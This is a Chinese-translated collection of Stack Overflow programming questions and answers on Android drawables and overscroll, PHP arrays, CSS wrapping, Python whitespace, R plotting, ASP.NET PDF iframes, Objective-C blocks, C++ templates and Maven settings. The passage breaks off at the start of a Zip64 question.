奇怪的是，似乎没有办法在 XML 中做到这一点。但是，通过代码，您可以。以下方法：

[`BitmapDrawable.setTileModeX(Shader.TileMode mode)`](http://developer.android.com/reference/android/graphics/drawable/BitmapDrawable.html#setTileModeX%28android.graphics.Shader.TileMode%29) [`BitmapDrawable.setTileModeY(Shader.TileMode mode)`](http://developer.android.com/reference/android/graphics/drawable/BitmapDrawable.html#setTileModeY%28android.graphics.Shader.TileMode%29)

应该做你需要的。只需为您需要重复效果的任何轴（垂直轴为 y 轴）传入其中一个[`Shader.TileMode`](http://developer.android.com/reference/android/graphics/Shader.TileMode.html)枚举 ( `REPEAT`, `MIRROR`, )。`CLAMP`

所以你应该能够做这样的事情：

```
BitmapDrawable draw = (BitmapDrawable)getResources().getDrawable(R.drawable.draw);
draw.setTileModeY(Shader.TileMode.REPEAT); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-26T07:56:50.110

我觉得这很简单：（此代码将在 Y 中平铺并在 x 中重复）

在您的 onWindowFoucsChanged 中，您调用：

```
 public void onWindowFocusChanged(boolean hasFocus) {
        // TODO Auto-generated method stub
        super.onWindowFocusChanged(hasFocus);
        Drawable d = getRepeatingBG(this, R.drawable.image_that_you_want_to_repeat);
        body_view.setBackgroundDrawable(d);

    }

private Drawable getRepeatingBG(Activity activity, int center)
    {   

        DisplayMetrics dm = new DisplayMetrics();
        activity.getWindowManager().getDefaultDisplay().getMetrics(dm);

        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inScaled=true;

        Bitmap center_bmp = BitmapFactory.decodeResource(activity.getResources(), center, options);
        center_bmp.setDensity(Bitmap.DENSITY_NONE);
        center_bmp=Bitmap.createScaledBitmap(center_bmp, dm.widthPixels , center_bmp.getHeight(), true);

        BitmapDrawable center_drawable = new BitmapDrawable(activity.getResources(),center_bmp);
//change here setTileModeY to setTileModeX if you want to repear in X
        center_drawable.setTileModeY(Shader.TileMode.REPEAT);

        return center_drawable;
    } 
```

# php - 转换多维数组，和/或转换为 stdClass 对象

> ID：11603235
> 
> 赞同：-1
> 
> 时间：2012-07-22T19:13:10.230
> 
> 标签：php, matomo

我在使用 Piwik API 提供的 PHP 格式数组时遇到问题，因为它在此处输出代码：

```
array (
 0 => 
  array (
    'idsite' => '2',
    'name' => 'coolrob335.com',
    'main_url' => 'http://coolrob335.com',
    'ts_created' => '2012-06-02 21:05:56',
    'ecommerce' => '0',
    'timezone' => 'Europe/London',
    'currency' => 'GBP',
    'excluded_ips' => '',
    'excluded_parameters' => '',
    'group' => '',
    'feedburnerName' => NULL,
  ),
 1 => 
  array (
    'idsite' => '3',
    'name' => 'robbrazier.com',
    'main_url' => 'http://robbrazier.com',
    'ts_created' => '2012-06-04 14:17:28',
    'ecommerce' => '0',
    'timezone' => 'Europe/London',
    'currency' => 'GBP',
    'excluded_ips' => '',
    'excluded_parameters' => '',
    'group' => '',
    'feedburnerName' => NULL,
  ),
) 
```

我想知道的是：有没有办法直接操作这个数组，因为使用 $obj[0]['idsite'], $obj[0]->idsite 不起作用（我知道后者不会工作，因为它不是 stdClass 对象）。

那么，有没有办法将上面链接中显示的数组从

```
array (
   0 => 
    array (
      'idsite' => '2', 
```

类似于

```
array (
   0 => 
     array (
      ['idsite'] => '2', 
```

或将其转换为 stdClass 对象，以便对其进行操作？（我已经搜索了 SO 和 google 以将多维数组转换为 stdClass 对象，但在这种情况下没有一个解决方案有效。可能是因为它们不是`[] => ''`

在旁注中：我想要做的是获取'idsite'和'name'，将其转换为以'name'作为链接标题的列表，例如它会是

```
$url = "{$user_data['piwik_server']}/index.php?module=API&method=API.get&idSite={$obj->id}&format=PHP&prettyDisplay=1&serialize=0&token_auth={$user_data['apikey']}"

<a href="<?php $url; ?>"><?php $obj->name; ?></a> 
```

（我知道这很可能必须在 foreach/while 循环中才能有效地工作）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:21:30.643

使用您提供的数组，以下代码：

```
function toObject($any) {
    $rv = new stdClass();

    if (is_array($any)) {
        foreach($any as $k => $v) {
            $rv->$k = is_array($v)
                ? toObject($v)
                : $v;
        }
   } else {
        $rv = (object) $any;
    }

    return $rv;
}

$o = toObject($a);

var_dump($o); 
```

将生成此输出：

```
object(stdClass)#1 (2) {
  ["0"]=>
  object(stdClass)#2 (11) {
    ["idsite"]=>
    string(1) "2"
    ["name"]=>
    string(14) "coolrob335.com"
    ["main_url"]=>
    string(21) "http://coolrob335.com"
    ["ts_created"]=>
    string(19) "2012-06-02 21:05:56"
    ["ecommerce"]=>
    string(1) "0"
    ["timezone"]=>
    string(13) "Europe/London"
    ["currency"]=>
    string(3) "GBP"
    ["excluded_ips"]=>
    string(0) ""
    ["excluded_parameters"]=>
    string(0) ""
    ["group"]=>
    string(0) ""
    ["feedburnerName"]=>
    NULL
  }
  ["1"]=>
  object(stdClass)#3 (11) {
    ["idsite"]=>
    string(1) "3"
    ["name"]=>
    string(14) "robbrazier.com"
    ["main_url"]=>
    string(21) "http://robbrazier.com"
    ["ts_created"]=>
    string(19) "2012-06-04 14:17:28"
    ["ecommerce"]=>
    string(1) "0"
    ["timezone"]=>
    string(13) "Europe/London"
    ["currency"]=>
    string(3) "GBP"
    ["excluded_ips"]=>
    string(0) ""
    ["excluded_parameters"]=>
    string(0) ""
    ["group"]=>
    string(0) ""
    ["feedburnerName"]=>
    NULL
  }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T19:48:41.990

尝试这个

```
$arr=array (
    array (
       'idsite' => '2',
       'name' => 'coolrob335.com',
       'main_url' => 'http://coolrob335.com',
       'ts_created' => '2012-06-02 21:05:56',
       'ecommerce' => '0',
       'timezone' => 'Europe/London',
       'currency' => 'GBP',
       'excluded_ips' => '',
       'excluded_parameters' => '',
       'group' => '',
       'feedburnerName' => NULL,
    ),
    array (
        'idsite' => '3',
        'name' => 'robbrazier.com',
        'main_url' => 'http://robbrazier.com',
        'ts_created' => '2012-06-04 14:17:28',
        'ecommerce' => '0',
        'timezone' => 'Europe/London',
        'currency' => 'GBP',
        'excluded_ips' => '',
        'excluded_parameters' => '',
        'group' => '',
        'feedburnerName' => NULL,
    ),
);

foreach($arr as $k=>$v) $obj[$k]=(object)$v;
echo $obj[0]->idsite; // 2
echo $obj[0]->name; // coolrob335.com 
```

[**演示**。](http://codepad.viper-7.com/gius9t)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-30T01:36:16.303

将 PIwik API 与 PHP 数据一起使用时，您应该做的是在 HTTP 请求中设置 &serialize=1（而不是您正在执行的 serialize=0），然后简单地运行

```
$value = unserialize($value); 
```

然后，您将获得准备好使用的阵列。

# html - 限制css中的文本区域

> ID：11603238
> 
> 赞同：0
> 
> 时间：2012-07-22T19:13:26.590
> 
> 标签：html, css, text, margin

我试图限制我可以在我的网站上写文字的区域。

```
<div id="header">
<div id="text"> 
     sample text 
</div>
</div> 
```

当我尝试在 中写入许多字符时`text`，超出给定空间时没有换行符。

```
#header
{
 background-color: #fff;
 height: 100px;

}

#text
{
 margin-left: 200px;
 width: 200px;
} 
```

我的错误是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:20:34.207

这样做： -

```
#text
{
    margin-left: 200px;
    width: 200px;
    border: 1px solid;
    word-wrap: break-word;  
}​ 
```

参考**[现场演示](http://jsfiddle.net/SivaCharan/bwZKe/1/)**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T19:18:38.350

如果您尝试执行自动换行，以下将起作用。

```
#text{ 
   word-wrap: break-word;      /* Most modern browsers */       
   white-space: pre-wrap;      /* CSS3 */   
   white-space: -moz-pre-wrap; /* Firefox */    
   white-space: -pre-wrap;     /* older versions of Opera */   

} 
```

该`word-wrap`属性不仅限于较新的浏览器。较旧的浏览器似乎也支持它。

从 CSS3 草案中，

> 由于遗留原因，某些实验性 CSS 属性不遵循此前缀约定。两个常见的例子是 'word-wrap' 和 'text-overflow' 属性，在 CSS2.1 中引入供应商前缀策略之前，Microsoft Internet Explorer 引入了无前缀，随后其他浏览器实现了无前缀，创建了一个尽管缺乏 W3C 规范，但仍依赖于不带前缀的名称。

请参阅[此处](http://www.impressivewebs.com/word-wrap-css3/)的文章和[w3c 参考](http://www.w3.org/TR/CSS/)。

# php - 通过安排 PHP/MySQL INSERT 按日期发布文章

> ID：11603239
> 
> 赞同：1
> 
> 时间：2012-07-22T19:13:41.190
> 
> 标签：php, mysql

我有一个现有系统可以使用 PHP 将文章提交到 MySQL 数据库中。我想实现某种队列，所以我想知道是否可以允许提交者选择一个日期/时间，然后插入将在那个时候执行。这可能吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-22T19:19:55.793

实现这一点的更好方法不是为插入计时，而是为文章的发布计时。而不是在指定时间插入：

*   如果作者选择的是未来的时间，请将时间添加到 publish_time 列
*   显示文章时，仅显示过去发布时间的文章。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-22T19:19:42.927

如果您在 Linux 上，您可以设置[MySQL 事件](http://dev.mysql.com/doc/refman/5.1/en/events.html)，或者可能是更好的解决方案，设置[cron 作业。](http://en.wikipedia.org/wiki/Cron)

或者，您可以尝试使用[phpJobScheduler](http://www.phpjobscheduler.co.uk/)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-22T19:15:50.960

您可以在数据库 ex: article_to_publish 中创建带有 publish_date 列的附加表，然后通过 cron 运行一些发布操作。

如果您需要更多乐趣，可以查看[http://celeryproject.org/](http://celeryproject.org/)

# python - 折叠连续空白

> ID：11603241
> 
> 赞同：5
> 
> 时间：2012-07-22T19:13:44.780
> 
> 标签：python, regex, whitespace

我将如何折叠 python 中的连续空白？

```
"a b   c   d      e" --> "a b c d e" 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-07-22T19:14:53.163

假设

```
s = 'a b   c   d      e' 
```

然后

```
' '.join(s.split())
'a b c d e' 
```

会给你指定的输出。

这通过使用[split()](http://docs.python.org/library/stdtypes.html?highlight=split#str.split)将字符串分解为单个字符的列表，`['a', 'b', 'c', 'd', 'e']`然后使用[join()](http://docs.python.org/library/stdtypes.html?highlight=join#str.join)函数将它们再次连接成一个字符串。还负责处理任何前导`split()`或尾随空白。

基于*简单胜于复杂*（Python 之禅）以避免正则表达式“[两个问题](http://regex.info/blog/2006-09-15/247)”问题:)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-22T19:18:32.280

使用正则表达式（因为标签）：

```
re.sub('\s+', ' ', "a b   c   d      e") 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T19:36:15.533

如果您不关心第一个元素的前导空格和最后一个元素的尾随空格，请使用：

```
re.sub('\s+(?=\s)', '', str) 
```

如果你这样做了，那么删除那些前导和尾随空格的解决方案是：

```
re.sub('(?:^\s+|\s+(?=\s)|\s+$)', '', str) 
```

# javascript - 如何在 asp.net 图像控件中使用 OnClick 属性制作图像库

> ID：11603254
> 
> 赞同：1
> 
> 时间：2012-07-22T19:15:09.933
> 
> 标签：javascript, asp.net, ms-access, image-gallery

我在 asp.net 中开发了一个网站，它显示来自 Access 数据库的带有表单视图控件的汽车图片。如果用户单击或将光标放在该特定 ASP 图像上，那么我希望该图像出现在大视图中。我正在尝试使用 javascript 函数，但 ASP 图像没有用于调用 javascript 函数的 OnClick 属性。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-22T19:26:40.413

提供此类功能的 asp.net Web 控件称为 ImageMap，也许您应该使用此控件而不是 asp:img

请参阅 MSDN 上的示例 [http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.imagemap.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.imagemap.aspx)

# r - 在 r 中以相同的 pdf 或 png 输出 textplot 和 qplot

> ID：11603262
> 
> 赞同：5
> 
> 时间：2012-07-22T19:16:07.367
> 
> 标签：r, legend, ggplot2

我有一个使用 ggplot2 包中的 plot 生成的直方图：

![在此处输入图像描述](../Images/35184d28aa18b387d99416cc4347b570.png)

以及使用 gplots 包中的 textplot 生成的表格

![在此处输入图像描述](../Images/c0a3d0617ae0d7cd8d6d22e22e5e7003.png)

如果可能的话，我想以相同的 pdf 或 png 显示它们。

我试过 grid.arrange 没有运气。还有其他建议吗？由于每个表只有 5 行长，我还考虑将其作为 qplot 边缘的“图例”或文本框插入到绘图中。关于如何使它看起来不错的任何建议？谢谢你的想法。

## 解决方案＃＃

最后我去了，不幸的是我的配色方案看起来更糟......我已将此问题作为一个新问题发布。

![在此处输入图像描述](../Images/35424d7ff1dc2188bf0058da8212b8ae.png)

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-22T21:10:44.370

试试这个，

```
library(ggplot2)
library(gridExtra)

g = tableGrob(iris[1:2, 1:2])

p = qplot(1:10, 1:10, geom = "blank") +
     annotation_custom(g) # as inset

grid.arrange(p, g, ncol=1) # stacked
ggsave("plot-table.pdf", arrangeGrob(p, g, ncol=1)) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-07-22T21:29:27.377

这是 gridExtra 库的示例

```
my_hist<-ggplot(diamonds, aes(clarity, fill=cut)) + geom_bar()  
my_table<- tableGrob(head(diamonds)[,1:3],gpar.coretext = gpar(fontsize=8),gpar.coltext=gpar(fontsize=8), gpar.rowtext=gpar(fontsize=8))  
pdf("myplot.pdf")  
grid.arrange(my_hist,my_table, ncol=2)  
dev.off() 
```

您可以更改表格中的字体大小和 pdf 的大小： pdf("myplot.pdf",width=10, height = 6)
如果您喜欢不同的排列方式，您可能还需要一个空白面板：
blankPanel<- grid.rect(gp=gpar(col="white")) ![在此处输入图像描述](../Images/08f24303e2951879ebfaa1b6b43d8762.png)

# javascript - 处理在 iframe 内的新选项卡/窗口中打开

> ID：11603265
> 
> 赞同：2
> 
> 时间：2012-07-22T19:16:27.773
> 
> 标签：javascript, jquery, iframe

我有一个带有侧边菜单和 iframe 的简单 Web 应用程序，应用程序中的所有内容都加载到 iframe 中，但是如果用户在新选项卡/窗口中打开链接，则页面将在没有主页的情况下单独打开，我想要实现是当用户在新选项卡中打开链接时，带有 iframe 的主页会在新页面中加载，目标 url 在 iframe 内，那么可以这样做吗？主页的简单示例：

```
<html>
<head></head>
<body>
<div class='menu'>
<ul>
<li><a target='con' href='somepage.php'>item 1</a></li>
<li><a target='con' href='otherpage.php'>item 2</li>
</ul>
</div>
<iframe id='con' class='container'></iframe>
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-22T19:52:11.880

你需要使用一些小的 javascript 来做到这一点。

尝试这个：

```
<html>
<head></head>
<script>
    function func(linker){
        top.frames['con'].location.href = linker;
    }
</script>
<body>
<div class='menu'>
<ul>
<li><a onclick="func('somepage.php')">item 1</a></li>
<li><a onclick="func('otherpage.php')">item 2</a></li>
</ul>
</div>
<iframe id='con' class='container'></iframe>
</body>
</html> 
```

干杯。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-22T19:59:44.297

也可以试试这个：

```
function func(linker){
    document.getElementById('iframe').setAttribute('src',''page1.html');
} 
```

HTML 看起来像我之前的回答。:)

```
<li><a onclick="func('somepage.php')">item 1</a></li> 
```

# android - ScrollView : 用 Holo 改变边缘效果颜色

> ID：11603267
> 
> 赞同：5
> 
> 时间：2012-07-22T19:17:00.693
> 
> 标签：android, styles, themes, scrollview

我目前正在尝试更改到达滚动视图顶部或底部时出现的蓝色水平线的颜色。我试图在 Android res 文件夹中挖掘，但找不到任何明显的参考。

任何帮助将非常感激。

谢谢你。

更新：在尝试实现一个继承 ScrollView 的类并将 getSolidColor 设置为替代值之后，它似乎不起作用。当我到达滚动视图的底部或顶部时出现的水平条仍然是蓝色的。

更新2：实际上，我不应该提到边缘效果颜色，更具体地说是overScroll效果，但我不知道这个词。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-24T14:55:35.167

我找到了我的问题的部分答案，我实际上指的是 ScrollView 的 overscroll 属性。似乎可以使用以下代码禁用它：

```
<ScrollView
...
android:overScrollMode="never"
... /> 
```

但是，无法使用 overScrollHeader 和 overScrollFooter 属性修改颜色，因为它们的值会被忽略，而是显示默认的蓝色值。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-08-24T11:08:03.397

您可以使用边缘效果覆盖库来动态覆盖滚动视图上发光边缘的颜色。它使用起来非常简单，可以为您的应用程序添加一些独特性。在这里找到它：[https ://github.com/AndroidAlliance/EdgeEffectOverride](https://github.com/AndroidAlliance/EdgeEffectOverride)

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-01-20T21:03:29.527

您可以通过一些反射来更改`EdgeEffect`a 的颜色：`ScrollView`

```
public static void setEdgeGlowColor(final ScrollView scrollView, final int color) {
    try {
        final Class<?> clazz = ScrollView.class;
        final Field fEdgeGlowTop = clazz.getDeclaredField("mEdgeGlowTop");
        final Field fEdgeGlowBottom = clazz.getDeclaredField("mEdgeGlowBottom");
        fEdgeGlowTop.setAccessible(true);
        fEdgeGlowBottom.setAccessible(true);
        setEdgeEffectColor((EdgeEffect) fEdgeGlowTop.get(scrollView), color);
        setEdgeEffectColor((EdgeEffect) fEdgeGlowBottom.get(scrollView), color);
    } catch (final Exception ignored) {
    }
}

@SuppressLint("NewApi")
public static void setEdgeEffectColor(final EdgeEffect edgeEffect, final int color) {
    try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            edgeEffect.setColor(color);
            return;
        }
        final Field edgeField = EdgeEffect.class.getDeclaredField("mEdge");
        final Field glowField = EdgeEffect.class.getDeclaredField("mGlow");
        edgeField.setAccessible(true);
        glowField.setAccessible(true);
        final Drawable mEdge = (Drawable) edgeField.get(edgeEffect);
        final Drawable mGlow = (Drawable) glowField.get(edgeEffect);
        mEdge.setColorFilter(color, PorterDuff.Mode.SRC_IN);
        mGlow.setColorFilter(color, PorterDuff.Mode.SRC_IN);
        mEdge.setCallback(null); // free up any references
        mGlow.setCallback(null); // free up any references
    } catch (final Exception ignored) {
    }
} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-12-09T19:09:29.800

我找到了一种非常简单（但很老套）的方法来实现这一点（改变发光的颜色）：

```
int glowDrawableId = context.getResources().getIdentifier("overscroll_glow", "drawable", "android");
Drawable androidGlow = context.getResources().getDrawable(glowDrawableId);
androidGlow.setColorFilter(brandColor, PorterDuff.Mode.MULTIPLY); 
```

我利用了发光效果实际上是一个 Drawable 的事实（并且没有改变），并在其上应用了一个过滤器。更多关于它，在这里：[http ://evendanan.net/android/branding/2013/12/09/branding-edge-effect/](http://evendanan.net/android/branding/2013/12/09/branding-edge-effect/)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-07-22T19:25:11.393

[使用 api](https://stackoverflow.com/a/4678136/473637)似乎没有一种简单的方法可以做到这一点。但是，您可以尝试扩展`ScrollView`和覆盖该`getSolidColor()`方法，将背景设置为不同的颜色：

```
 new ScrollView(this) {
        @Override
        @ExportedProperty(category = "drawing")
        public int getSolidColor() {
            // Set a background color to a color you want for the edges.
        }
    }; 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-07-22T19:35:29.570

如果您希望褪色边缘和 ScrollView 的背景颜色相同，您可以添加：

```
<ScrollView
...
android:background="@color/yourColor"
... /> 
```

如果您希望边缘颜色不同，则必须扩展 ScrollView 并覆盖该`getSolidColor()`方法。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-03-25T14:27:25.073

这是更改过度滚动边缘线的方式：

```
 final int edgeDrawableId = res.getIdentifier("overscroll_edge", "drawable", "android");
        final Drawable overscrollEdge = res.getDrawable(edgeDrawableId);
        overscrollEdge.setColorFilter(res.getColor(colorID), android.graphics.PorterDuff.Mode.SRC_ATOP); 
```

# delphi - 确定驱动器号是本地驱动器还是网络驱动器？

> ID：11603271
> 
> 赞同：4
> 
> 时间：2012-07-22T19:17:48.053
> 
> 标签：delphi, delphi-xe2, network-drive, drive-letter

我正在开发一个具有共享文件夹输入的实用程序。我的应用程序要求所选文件夹位于远程计算机上，而不是本地计算机上。我想识别用户是否`C:\`从本地计算机中选择，而不是`Z:\`可能是网络驱动器。我如何验证这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-22T19:34:10.210

您需要的功能是[GetDriveType](http://msdn.microsoft.com/en-us/library/windows/desktop/aa364939(v=vs.85).aspx)。

# android - 使用 Facebook android SDK 登录自定义服务器

> ID：11603273
> 
> 赞同：2
> 
> 时间：2012-07-22T19:18:25.620
> 
> 标签：android, facebook, security, login

是否可以使用 Facebook Android SDK 登录以生成用户自定义密钥，然后登录我的自定义服务。

这是场景：我有一个 android 应用程序，以及一个基于用户输入运行推荐引擎的服务器。我希望用户在应用程序第一次运行时登录 Facebook，然后再也不登录。从 facebook 信息中，我希望能够向我的服务器传递一些允许安全登录的内容。

如果可能的话，你可以链接一个例子。

我有关于 OAuth 和其他你可以用

# asp.net - 在 iframe 中显示 PDF

> ID：11603277
> 
> 赞同：3
> 
> 时间：2012-07-22T19:18:48.723
> 
> 标签：asp.net, iframe

我为我的网站准备了一个解决方案，该解决方案使用下面的代码在整页中呈现请求的 PDF 文档。现在我的客户希望在 iframe 中呈现文档。我似乎无法让它轻松工作，也许我遗漏了一些明显的东西。第一个代码将在新窗口中正确显示 PDF。

```
 if (File.Exists(filename))
        {            
            //Set the appropriate ContentType.
            Response.ContentType = "Application/pdf";
            Response.WriteFile(filename);
            Response.End();
        }
        else Response.Write("Error - can not find report"); 
```

iframe 代码如下所示：

```
<iframe runat="server" id="iframepdf" height="600" width="800" > </iframe> 
```

我知道我应该使用 src 属性作为文件名，但问题似乎是 iframe 在 Page_Load 事件触发之前加载，因此没有创建 PDF。我有什么明显的遗漏吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-22T19:31:30.870

使用 ASHX 处理程序。getmypdf.ashx.cs 处理程序的源代码应如下所示：

```
using System;
using System.Web;

public class getmypdf : IHttpHandler 
{
  public void ProcessRequest(HttpContext context)
  {
        Response.ContentType = "Application/pdf";
        Response.WriteFile("myfile.pdf");
        Response.End();
  }

  public bool IsReusable 
  {
    get 
    {
      return false;
    }
  }
} 
```

getmypdf.ashx 将包含如下内容：

```
<% @ webhandler language="C#" class="getmypdf" %> 
```

你的 iframe 看起来像这样：

```
<iframe runat="server" id="iframepdf" height="600" width="800" src="..../getmypdf.ashx"> </iframe> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-22T19:52:32.310

我真的解决了这个问题！解决方案是生成另一个带有呈现 PDF 的代码的 aspx 页面 (showpdf.aspx)（它的核心是响应...代码），然后在 iframe 中调用该代码。我从源页面传递了必要的变量。谢谢大家！

```
<iframe runat="server" id="iframepdf" height="600" width="800"  >  
</iframe>

        protected void Page_Load(object sender, EventArgs e)
        {
            String encounterID = Request.QueryString["EncounterID"];
            iframepdf.Attributes.Add("src", "showpdf.aspx?EncounterID=" + Request.QueryString["EncounterID"]);
        } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-22T19:22:09.933

您需要将 设置为`src=""`提供 PDF 的不同 URL。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-22T19:33:05.690

你试过了吗：

```
window.onload = function() {
     document.getElementById("iframepdf").src = "the URL that loads the PDF"
} 
```

# iphone - 块内的弱引用

> ID：11603284
> 
> 赞同：11
> 
> 时间：2012-07-22T19:19:48.287
> 
> 标签：iphone, objective-c, ios

我正在使用`NSOperationQueue`和排队`NSOperationBlocks`。现在，块对块中的任何实例都有强引用，调用对象也对块有强引用，因此建议执行以下操作：

```
__weak Cell *weakSelf = self;
NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{
        UIImage *image = /* render some image */
        /* what if by the time I get here self no longer exists? */
        [[NSOperationQueue mainQueue] addOperationWithBlock:^{
            [weakSelf setImageViewImage:image];
        }];
    }];
    [self.renderQueue addOperation:op]; 
```

所以，我的问题是，假设当图像完成渲染并且该行返回时，该`Cell`对象不再存在（它已被释放，可能是由于单元重用，这有点难以正式化）。当我去访问`[weakSelf setImageViewImage:]`时，这会导致`EXC_BAD_ACCESS`错误吗？

目前我正在尝试追踪我的问题的原因是什么，我认为这可能与此有关。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-07-22T19:33:06.643

所以，`__weak`是一个归零弱参考。这意味着在您的操作过程中，`self`可能确实会被释放，但对它的所有弱引用（即`weakSelf`）将被清零。这意味着`[weakSelf setImageViewImage:image]`只是向 发送消息`nil`，这是安全的；或者，至少，它不应该导致`EXC_BAD_ACCESS`. （顺便说一句，如果你有资格`weakSelf`as `__unsafe_unretained`，你最终可能会向一个释放的对象发送消息。）

所以，我怀疑向`__weak`引用发送消息会导致崩溃。如果你想确保它`self`在你的操作过程中仍然存在，你可以在块范围内获得对弱的强引用：

```
__weak Cell *weakSelf = self;

NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{
    Cell *strongSelf = weakSelf; // object pointers are implicitly __strong
    // strongSelf will survive the duration of this operation.
    // carry on.
}]; 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-22T19:53:38.057

如果你不使用weak，你正在创建一个保留循环，但是一旦块完成执行，循环就会被打破。我可能不会在这里使用弱。

无论如何，您可以向 发送任何消息`nil`，它将被忽略。因此，如果`weakSelf`变量`nil`因为`Cell`对象被释放而被设置为，则`setImageViewImage:`消息将默默地不做任何事情。它不会崩溃。

由于您提到单元重用，我认为您`Cell`是`UITableViewCell`. 在这种情况下，您的示例代码存在严重问题。 `UITableViewCell`s 通常不会被释放。它们被放入单元重用队列。所以你的`weakSelf`变量不会被归零，因为弱引用只有在对象实际被释放时才会被归零。

到该`[weakSelf setImageViewImage:image]`行运行时，该单元格可能已被重新用于表示表中的不同行，并且您在单元格中放置了错误的图像。您应该将图像渲染代码移出`Cell`类，移到表视图的数据源类中：

```
- (void)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    Cell *cell = // get a cell...

    [self startLoadingImageForIndexPath:indexPath];
    return cell;
}

- (void)startLoadingImageForIndexPath:(NSIndexPath *)indexPath {
    NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{
        UIImage *image = [self renderImageForIndexPath:indexPath];
        dispatch_async(dispatch_get_main_queue(), ^{
            Cell *cell = [self.tableView cellForRowAtIndexPath:indexPath];
            [cell setImageViewImage:image];
        });
    }];
    [self.renderQueue addOperation:op];
} 
```

# c++ - 接收错误 C2664：传递向量时无法将参数 1 从 'std::vector<_Ty>' 转换为 'std::vector<_Ty,_Ax> &' 到模板化方法

> ID：11603289
> 
> 赞同：3
> 
> 时间：2012-07-22T19:20:54.540
> 
> 标签：c++, templates

我在我的 cpp 函数中引用了一个模板化的快速排序方法，如下所示：

主文件

```
QuickSort<vector<int>>(testData); 
```

其中 testData 是：

```
int arr[] = {0, 5, 3, 4, 2, 1, 4};
vector<int> testData (arr, arr + sizeof(arr) / sizeof(arr[0])); 
```

.h 文件中快速排序的声明为：

排序.h

```
template <typename T>
void QuickSort(std::vector<T>& Unsorted); 
```

函数定义为：

排序.cpp

```
template <typename T>
void QuickSort(std::vector<T>& Unsorted) 
{
         //implementation here
} 
```

我失去理智了吗？我只是想通过引用传递一个整数向量。有人能告诉我哪里出错了吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-22T19:24:51.577

模板不能有单独的定义和声明

还

```
QuickSort<int>(vec); 
```

如果函数声明和定义必须在 saem 位置，即：

```
#include <vector>

template <typename T>
void qs(std::vector<T>&v );

int main() {
  std::vector<int> v;
  qs(v);
}

void qs(std::vector<T>&v ) { 
} 
```

不会编译，什么时候

```
#include <vector>

template <typename T>
void qs(std::vector<T>&v ) {}

int main() {
  std::vector<int> v;
  qs(v);
} 
```

编译得很好，在 stl 中检查模板函数是如何制作的。问题是，编译器必须在使用之前知道整个函数，而在你的情况下他不知道

# android - 如何更改 M2E 本地存储库位置？

> ID：11603291
> 
> 赞同：3
> 
> 时间：2012-07-22T19:20:56.650
> 
> 标签：android, eclipse, maven

**我的问题是关于 Maven、M2E、Android 和 Eclipse。**

经过一些故障排除后，我设法从 M2E 网站运行了示例。

**除了我的 Maven 本地存储库位置外，**一切正常

 **a）我有全局变量 M2 M2_HOME 和这样的设置

b) 我的 Maven 设置在 E:\maven\repo\repository

c) 我的 Maven conf\settings.xml 包含上述位置仓库地址

Eclipse 中的 Maven 设置仍将用户主目录 .m2 反映为本地存储库，并且不可编辑。我重新加载了 conf\settings.xml 但无济于事。

一个建议指出我应该更改 Java 构建路径设置，但 Eclipse 中的本地存储库变量是不可修改的。

另一位用户发布了类似的问题，并建议他们更改 Eclipse 中的全局设置 settings.xml 文件，**但**问题仍然存在。

这是我对本地存储库的 settings.xml 设置

```
 <!-- localRepository
   | The path to the local repository maven will use to store artifacts.
   |
   | Default: ~/.m2/repository
  <localRepository>E:/maven/repo/repository</localRepository> 
```

我真的很想知道如何让它工作，这真的让我很烦！

感谢所有建议和帮助，谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-23T01:24:24.460

正如我所怀疑的那样，配置被注释掉了（在 XML 中`<!--`标记了注释的开始和注释`-->`的结束）。只需移动`<localRepository>E:/maven/repo/repository</localRepository>`后面的线`-->`。然后配置应该是活动的。**

# java - 如何让 Apache Commons Zip——Zip64 工作

> ID：11603295
> 
> 赞同：0
> 
> 时间：2012-07-22T19:22:12.860
> 
> 标签：java, zip, apache-commons

